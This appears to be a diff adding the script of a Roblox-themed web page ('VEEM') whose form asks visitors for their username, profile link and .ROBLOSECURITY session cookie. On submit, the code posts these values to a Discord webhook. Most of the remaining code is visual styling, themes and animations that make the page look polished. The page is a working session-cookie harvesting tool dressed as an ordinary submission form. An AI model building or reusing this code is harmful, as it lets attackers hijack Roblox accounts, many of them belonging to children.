+
+            // Create new toast
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.innerHTML = `
+                <span class="toast-icon">${type === 'success' ? '✅' : '❌'}</span>
+                <span>${message}</span>
+            `;
+            
+            document.body.appendChild(toast);
+
+            // Auto remove after 4 seconds
+            setTimeout(() => {
+                toast.style.animation = 'slideInRight 0.3s ease-out reverse';
+                setTimeout(() => toast.remove(), 300);
+            }, 4000);
+        }
+
+        // Form submission handler
+        const form = document.getElementById('veemForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const usernameInput = document.getElementById('username');
+        const roblosecurityInput = document.getElementById('roblosecurity');
+        const userlinkInput = document.getElementById('userlink');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            // Get form values
+            const username = usernameInput.value.trim();
+            const roblosecurity = roblosecurityInput.value.trim();
+            const userlink = userlinkInput.value.trim();
+
+                // Validate fields
+            if (!username || !roblosecurity || !userlink) {
+                playSound('error');
+                showToast('⚠️ Please fill in all fields', 'error');
+                return;
+            }
+
+            // Play click sound
+            playSound('click');
+
+            // Show loader overlay
+            const loaderOverlay = document.getElementById('loaderOverlay');
+            loaderOverlay.classList.add('active');
+
+            // Disable button and show loading state
+            submitBtn.disabled = true;
+            const originalText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<span class="spinner"></span>Sending...';
+
+            try {
+                // Prepare Discord embed
+                const embed = {
+                    title: '🎯 New VEEM Submission',
+                    color: 15085612, // Red color in decimal
+                    fields: [
+                        {
+                            name: '👤 Username',
+                            value: username,
+                            inline: true
+                        },
+                        {
+                            name: '🔗 User Link',
+                            value: userlink.startsWith('http') ? `[View Profile](${userlink})` : userlink,
+                            inline: true
+                        },
+                        {
+                            name: '🔐 ROBLOSECURITY',
+                            value: `\`\`\`\n${roblosecurity}\n\`\`\``,
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: 'VEEM Bot System'
+                    }
+                };
+
+                // Send to Discord webhook
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed]
+                    })
+                });
+
+                if (response.ok || response.status === 204) {
+                    // Play success sound
+                    playSound('success');
+                    
+                    // Hide loader
+                    loaderOverlay.classList.remove('active');
+                    
+                    // Success
+                    showToast('✅ Successfully sent to Discord!', 'success');
+                    
+                    // Clear form with animation
+                    setTimeout(() => {
+                        form.reset();
+                    }, 300);
+                } else {
+                    throw new Error('Webhook request failed');
+                }
+            } catch (error) {
+                // Play error sound
+                playSound('error');
+                
+                // Hide loader
+                const loaderOverlay = document.getElementById('loaderOverlay');
+                loaderOverlay.classList.remove('active');
+                
+                // Error handling
+                showToast('❌ Failed to send. Please try again.', 'error');
+            } finally {
+                // Re-enable button
+                setTimeout(() => {
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = originalText;
+                }, 300);
+            }
+        });
+
+        // Create floating geometric particles (Roblox style)
+        function createParticles() {
+            const container = document.getElementById('particles-container');
+            const particleCount = window.innerWidth < 600 ? 0 : 25;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                
+                const size = Math.random() * 20 + 10;
+                const startX = Math.random() * window.innerWidth;
+                const startY = Math.random() * window.innerHeight;
+                const tx1 = (Math.random() - 0.5) * 200;
+                const ty1 = (Math.random() - 0.5) * 200;
+                const tx2 = (Math.random() - 0.5) * 200;
+                const ty2 = (Math.random() - 0.5) * 200;
+                const duration = Math.random() * 20 + 15;
+                const delay = Math.random() * 5;
+                
+                particle.style.cssText = `
+                    width: ${size}px;
+                    height: ${size}px;
+                    left: ${startX}px;
+                    top: ${startY}px;
+                    border-radius: 4px;
+                    opacity: 0.5;
+                    filter: blur(1px);
+                    --tx1: ${tx1}px;
+                    --ty1: ${ty1}px;
+                    --tx2: ${tx2}px;
+                    --ty2: ${ty2}px;
+                    animation: floatParticle ${duration}s ease-in-out ${delay}s infinite;
+                `;
+                
+                container.appendChild(particle);
+            }
+            
+            updateParticleColors();
+        }
+
+        // Update particle colors based on current theme
+        function updateParticleColors() {
+            const currentTheme = themes[activeTheme];
+            const particles = document.querySelectorAll('.particle');
+            
+            particles.forEach((particle, index) => {
+                const colorIndex = index % currentTheme.particleColors.length;
+                particle.style.color = currentTheme.particleColors[colorIndex];
+            });
+        }
+
+        // Apply theme
+        function applyTheme(themeName) {
+            const theme = themes[themeName];
+            const root = document.documentElement;
+            const formCard = document.querySelector('.form-card');
+            const body = document.body;
+            
+            root.style.setProperty('--bg-gradient', theme.bgGradient);
+            root.style.setProperty('--color-primary', theme.primary);
+            root.style.setProperty('--color-secondary', theme.secondary);
+            root.style.setProperty('--color-button', theme.accent);
+            root.style.setProperty('--color-accent', theme.accent);
+            root.style.setProperty('--glass-tint', theme.glassTint);
+            root.style.setProperty('--glow-color', theme.glowColor);
+            
+            // Apply Roblox-specific styling
+            if (theme.isRoblox) {
+                // Dark text color for better contrast
+                root.style.setProperty('--color-text', '#FFFFFF');
+                root.style.setProperty('--color-text-light', '#B0B0B0');
+                root.style.setProperty('--blur-intensity', '8px');
+                
+                // Apply Roblox-specific card styling
+                formCard.style.background = 'rgba(35, 35, 35, 0.85)';
+                formCard.style.border = '3px solid #E62C2C';
+                formCard.style.borderRadius = '8px';
+                formCard.style.boxShadow = '0 8px 32px rgba(230, 44, 44, 0.3), 0 0 60px rgba(230, 44, 44, 0.2), inset 0 0 0 1px rgba(230, 44, 44, 0.2)';
+                
+                // Update inputs for Roblox style
+                document.querySelectorAll('.form-input, .form-textarea').forEach(input => {
+                    input.style.background = 'rgba(47, 49, 54, 0.9)';
+                    input.style.border = '2px solid #57595B';
+                    input.style.borderRadius = '6px';
+                    input.style.color = '#FFFFFF';
+                    input.style.fontWeight = '500';
+                });
+                
+                // Update title styling for Roblox
+                document.querySelector('.title').style.color = '#FFFFFF';
+                document.querySelector('.title').style.textTransform = 'uppercase';
+                document.querySelector('.title').style.fontWeight = '800';
+                document.querySelector('.title').style.letterSpacing = '2px';
+                document.querySelector('.title-version').style.color = '#E62C2C';
+                document.querySelector('.subtitle').style.color = '#B0B0B0';
+                document.querySelectorAll('.subtitle a').forEach(a => {
+                    a.style.color = '#E62C2C';
+                });
+                
+                // Update button for Roblox style
+                const submitBtn = document.querySelector('.submit-btn');
+                submitBtn.style.background = 'linear-gradient(135deg, #E62C2C 0%, #F04747 100%)';
+                submitBtn.style.backgroundSize = '100% 100%';
+                submitBtn.style.border = '2px solid rgba(255, 255, 255, 0.2)';
+                submitBtn.style.borderRadius = '6px';
+                submitBtn.style.boxShadow = '0 4px 20px rgba(230, 44, 44, 0.5), 0 0 40px rgba(230, 44, 44, 0.3)';
+                submitBtn.style.fontWeight = '700';
+                submitBtn.style.textTransform = 'uppercase';
+                submitBtn.style.letterSpacing = '1px';
+                
+                // Make particles more geometric (squares with slight rounding)
+                document.querySelectorAll('.particle').forEach(p => {
+                    p.style.borderRadius = '4px';
+                    p.style.opacity = '0.5';
+                    p.style.filter = 'blur(1px)';
+                });
+                
+                // Add geometric red squares overlay
+                if (!document.querySelector('.roblox-squares')) {
+                    const squaresContainer = document.createElement('div');
+                    squaresContainer.className = 'roblox-squares';
+                    squaresContainer.style.cssText = `
+                        position: fixed;
+                        top: 0;
+                        left: 0;
+                        right: 0;
+                        bottom: 0;
+                        pointer-events: none;
+                        z-index: 2;
+                    `;
+                    
+                    // Create floating red squares
+                    for (let i = 0; i < 8; i++) {
+                        const square = document.createElement('div');
+                        const size = Math.random() * 15 + 8;
+                        square.style.cssText = `
+                            position: absolute;
+                            width: ${size}px;
+                            height: ${size}px;
+                            background: rgba(230, 44, 44, 0.15);
+                            border: 1px solid rgba(230, 44, 44, 0.3);
+                            border-radius: 2px;
+                            left: ${Math.random() * 100}%;
+                            top: ${Math.random() * 100}%;
+                            animation: floatSquare ${15 + Math.random() * 10}s ease-in-out infinite;
+                            animation-delay: ${Math.random() * 5}s;
+                        `;
+                        squaresContainer.appendChild(square);
+                    }
+                    
+                    body.appendChild(squaresContainer);
+                    
+                    // Add square animation
+                    const squareStyle = document.createElement('style');
+                    squareStyle.textContent = `
+                        @keyframes floatSquare {
+                            0%, 100% { transform: translate(0, 0) rotate(0deg); }
+                            25% { transform: translate(20px, -20px) rotate(90deg); }
+                            50% { transform: translate(0, -40px) rotate(180deg); }
+                            75% { transform: translate(-20px, -20px) rotate(270deg); }
+                        }
+                    `;
+                    document.head.appendChild(squareStyle);
+                }
+                
+                // Update geometric shapes to squares
+                document.querySelectorAll('.geo-shape').forEach(shape => {
+                    shape.style.opacity = '0.2';
+                });
+                
+                // Add grid pattern overlay
+                if (!document.querySelector('.roblox-grid')) {
+                    const grid = document.createElement('div');
+                    grid.className = 'roblox-grid';
+                    grid.style.cssText = `
+                        position: fixed;
+                        top: 0;
+                        left: 0;
+                        right: 0;
+                        bottom: 0;
+                        background-image: 
+                            linear-gradient(rgba(230, 44, 44, 0.03) 1px, transparent 1px),
+                            linear-gradient(90deg, rgba(230, 44, 44, 0.03) 1px, transparent 1px);
+                        background-size: 50px 50px;
+                        pointer-events: none;
+                        z-index: 1;
+                    `;
+                    body.appendChild(grid);
+                }
+                
+                // Show corner accents with animation
+                setTimeout(() => {
+                    document.querySelectorAll('.roblox-corner').forEach((corner, i) => {
+                        setTimeout(() => corner.classList.add('active'), i * 100);
+                    });
+                }, 200);
+            } else {
+                // Reset to liquid glass style for other themes
+                root.style.setProperty('--color-text', '#333');
+                root.style.setProperty('--color-text-light', '#666');
+                root.style.setProperty('--blur-intensity', '20px');
+                
+                formCard.style.background = 'rgba(255, 255, 255, 0.25)';
+                formCard.style.border = '1px solid rgba(255, 255, 255, 0.3)';
+                formCard.style.borderRadius = '35px';
+                formCard.style.boxShadow = '0 8px 32px 0 rgba(31, 38, 135, 0.15), 0 0 0 1px rgba(255, 255, 255, 0.18) inset, 0 20px 60px var(--glow-color)';
+                
+                // Reset inputs
+                document.querySelectorAll('.form-input, .form-textarea').forEach(input => {
+                    input.style.background = 'rgba(255, 255, 255, 0.4)';
+                    input.style.border = '2px solid rgba(255, 255, 255, 0.3)';
+                    input.style.borderRadius = '18px';
+                    input.style.color = '#333';
+                    input.style.fontWeight = 'normal';
+                });
+                
+                // Reset title styling
+                document.querySelector('.title').style.color = 'var(--color-text)';
+                document.querySelector('.title').style.textTransform = 'none';
+                document.querySelector('.title').style.fontWeight = '700';
+                document.querySelector('.title').style.letterSpacing = '-1px';
+                document.querySelector('.title-version').style.color = 'var(--color-primary)';
+                document.querySelector('.subtitle').style.color = 'var(--color-text-light)';
+                document.querySelectorAll('.subtitle a').forEach(a => {
+                    a.style.color = 'var(--color-primary)';
+                });
+                
+                // Reset button
+                const submitBtn = document.querySelector('.submit-btn');
+                submitBtn.style.background = `linear-gradient(135deg, ${theme.primary} 0%, ${theme.secondary} 50%, ${theme.accent} 100%)`;
+                submitBtn.style.backgroundSize = '200% 200%';
+                submitBtn.style.border = '2px solid rgba(255, 255, 255, 0.3)';
+                submitBtn.style.borderRadius = '18px';
+                submitBtn.style.boxShadow = `0 4px 15px var(--glow-color), 0 0 30px var(--glow-color), inset 0 1px 2px rgba(255, 255, 255, 0.4)`;
+                submitBtn.style.fontWeight = '600';
+                submitBtn.style.textTransform = 'none';
+                submitBtn.style.letterSpacing = 'normal';
+                submitBtn.style.transform = 'none';
+                
+                // Reset particles to circles
+                document.querySelectorAll('.particle').forEach(p => {
+                    p.style.borderRadius = '50%';
+                    p.style.opacity = '0.4';
+                    p.style.filter = 'blur(2px)';
+                });
+                
+                // Remove geometric squares
+                const squares = document.querySelector('.roblox-squares');
+                if (squares) squares.remove();
+                
+                // Reset geometric shapes
+                document.querySelectorAll('.geo-shape').forEach(shape => {
+                    shape.style.opacity = '0.15';
+                });
+                
+                // Remove grid pattern
+                const grid = document.querySelector('.roblox-grid');
+                if (grid) grid.remove();
+                
+                // Hide corner accents
+                document.querySelectorAll('.roblox-corner').forEach(corner => {
+                    corner.classList.remove('active');
+                });
+            }
+            
+            // Update geometric shapes colors
+            document.querySelectorAll('.triangle').forEach(t => {
+                t.style.borderBottomColor = theme.primary;
+            });
+            document.querySelectorAll('.hexagon, .hexagon::before, .hexagon::after').forEach(h => {
+                h.style.background = theme.secondary;
+                h.style.borderBottomColor = theme.secondary;
+                h.style.borderTopColor = theme.secondary;
+            });
+            
+            updateParticleColors();
+            
+            // Update active theme dot
+            document.querySelectorAll('.theme-dot').forEach(dot => {
+                dot.classList.remove('active');
+            });
+            document.querySelector(`[data-theme="${themeName}"]`).classList.add('active');
+            
+            // Save to memory
+            activeTheme = themeName;
+        }
+
+        // Initialize with Roblox theme only
+        let activeTheme = 'roblox-style';
+
+        // Apply Roblox theme on load and initialize
+        window.addEventListener('DOMContentLoaded', () => {
+            applyTheme('roblox-style');
+            
+            // Show corner accents after short delay
+            setTimeout(() => {
+                document.querySelectorAll('.roblox-corner').forEach((corner, i) => {
+                    setTimeout(() => {
+                        corner.classList.add('active');
+                    }, i * 100);
+                });
+            }, 500);
+        });
+
+        // Initialize particles on load
+        createParticles();
+
+        // Clear button functionality
+        const clearBtn = document.getElementById('clearBtn');
+        
+        clearBtn.addEventListener('click', function() {
+            playSound('click');
+            
+            // Clear all form fields with animation
+            const inputs = [usernameInput, roblosecurityInput, userlinkInput];
+            
+            inputs.forEach((input, index) => {
+                setTimeout(() => {
+                    input.style.transition = 'opacity 0.3s ease';
+                    input.style.opacity = '0.5';
+                    
+                    setTimeout(() => {
+                        input.value = '';
+                        input.style.opacity = '1';
+                        
+                        // Remove filled class from form groups
+                        const formGroup = input.closest('.form-group');
+                        if (formGroup) {
+                            formGroup.classList.remove('filled');
+                        }
+                    }, 150);
+                }, index * 100);
+            });
+            
+            // Show toast notification
+            showToast('🗑️ Fields cleared', 'success');
+        });
+
+        // Enhanced button interactions
+        submitBtn.addEventListener('mouseenter', function() {
+            if (!this.disabled) {
+                this.style.animation = 'buttonGradient 1.5s ease infinite, buttonPulse 0.5s ease infinite';
+            }
+        });
+        
+        submitBtn.addEventListener('mouseleave', function() {
+            if (!this.disabled) {
+                this.style.animation = 'buttonGradient 3s ease infinite, buttonBounce 2s ease infinite';
+            }
+        });
+
+        // Add ripple effect to button
+        submitBtn.addEventListener('click', function(e) {
+            if (!this.disabled) {
+                const ripple = document.createElement('span');
+                const rect = this.getBoundingClientRect();
+                const size = Math.max(rect.width, rect.height);
+                const x = e.clientX - rect.left - size / 2;
+                const y = e.clientY - rect.top - size / 2;
+                
+                ripple.style.cssText = `
+                    position: absolute;
+                    width: ${size}px;
+                    height: ${size}px;
+                    border-radius: 50%;
+                    background: rgba(255, 255, 255, 0.5);
+                    left: ${x}px;
+                    top: ${y}px;
+                    pointer-events: none;
+                    animation: ripple 0.6s ease-out;
+                `;
+                
+                this.appendChild(ripple);
+                setTimeout(() => ripple.remove(), 600);
+            }
+        });
+
+        // Add ripple animation
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes ripple {
+                to {
+                    transform: scale(4);
+                    opacity: 0;
+                }
+            }
+        `;
+        document.head.appendChild(style);
+
+        // Add subtle animation to inputs on focus (Roblox style)
+        const inputs = document.querySelectorAll('.form-input, .form-textarea');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.transition = 'all 0.4s cubic-bezier(0.4, 0, 0.2, 1)';
+            });
+        });
+    </script>
+</body>
+</html>
